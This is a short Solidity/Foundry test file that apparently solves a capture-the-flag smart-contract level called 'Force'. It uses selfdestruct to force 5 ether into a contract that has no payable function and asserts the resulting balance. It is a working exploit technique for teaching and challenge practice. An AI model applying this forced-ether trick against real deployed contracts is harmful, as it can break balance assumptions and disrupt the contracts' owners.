// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";
import {Force} from "../Force.sol";
 
contract ForceTest is Test {
    Force force;
    function setUp() public {
        force = new Force();
        vm.deal(address(this), 5 ether);
    }
    function test_Challenge7_Passed() public {
        forceEthToContract();
    }
    function forceEthToContract() public {
        selfdestruct(payable(address(force)));
        assert(address(force).balance != 0);
        assert(address(force).balance == 5 ether);
    }
}